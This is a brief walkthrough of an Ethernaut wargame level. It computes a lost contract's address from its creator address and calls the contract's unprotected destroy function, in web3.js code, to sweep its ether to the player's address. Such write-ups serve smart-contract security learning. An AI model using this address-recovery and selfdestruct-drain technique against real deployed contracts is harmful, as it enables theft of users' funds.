## Can be solved directly on ethernaut page
1. We'd need to figure out how to get the lost contract address. There are 2 simple ways of doing so:
    1. Calculate the address using a formula (based on how new contract addresses are determined from the ethereum yellow paper). This can be done using the following code:
    ```
    fullStr = web3.utils.soliditySha3("0xd6", "0x94", contract.address, "0x01") 
    contractAdd = "0x" + fullStr.slice(-40)
    ```
    2. Get the address from etherscan based on the factory address. Look into the internal transactions tab and look for the latest contract creation transaction to get the token contract address.
2. Once we have the address, we'd just need to call the destroy function and pass in our player address to get the funds.
```
data = web3.eth.abi.encodeFunctionCall({
    name: "destroy",
    type: "function",
    inputs: [{
        type: "address",
        name: "_to"
        }]
    }, [player])
await web3.eth.sendTransaction({
    to: contractAdd,
    from: player,
    data: data
})
```